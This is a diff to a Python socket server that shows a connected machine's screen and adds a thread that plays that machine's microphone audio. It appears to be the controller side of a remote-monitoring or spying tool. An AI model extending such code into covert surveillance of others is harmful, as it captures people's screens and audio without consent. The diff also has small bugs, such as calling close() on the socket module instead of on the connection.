@@ -1,15 +1,13 @@
 import socket
 import cv2
 import pickle
+import pyaudio
 import struct
 from colorama import Fore
 from os import system, path
 
-from vidstream import StreamingServer
-
-
-server = StreamingServer('127.0.0.1', 9999)
-server.start_server()
+# from vidstream import StreamingServer
+from threading import Thread
 
 
 """ Variables """
@@ -52,9 +50,13 @@ class Server:
         self.conn, self.addr = self.sock.accept()
         print(f"{dol}Connected - {wl}{self.addr[0]}")
     
-    def getscreen(self):
+    def get_screen(self):
         payload_size = struct.calcsize('>L')
         data = b""
+        
+        self.running_micro = True
+        thr = Thread(target=self.get_micro).start()
+
 
         while True:
             break_loop = False
@@ -84,11 +86,42 @@ class Server:
             frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
             cv2.imshow(str(self.addr), frame)
             if cv2.waitKey(1) == ord("q"):
+                self.running_micro = False
                 cv2.destroyAllWindows()
                 break
 
+    def get_micro(self):
+        port = 9112
+
+        chunk = 8192
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 1
+        RATE = 44100
+
+        p = pyaudio.PyAudio()
+        stream = p.open(format=FORMAT,
+                        channels=CHANNELS,
+                        rate=RATE,
+                        input=True,
+                        output=True,
+                        frames_per_buffer=chunk)
+
+        sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock1.connect((self.HOST, port))
+        while self.running_micro:
+            try:
+                data = sock1.recv(32768)
+                if data == b"":
+                    continue
+                stream.write(data,chunk)
+            except:
+                self.running_micro = False
+            
+
+        socket.close()
 
 """ Start """
 server = Server()
 server.build()
-server.getscreen()
+
+server.get_screen()
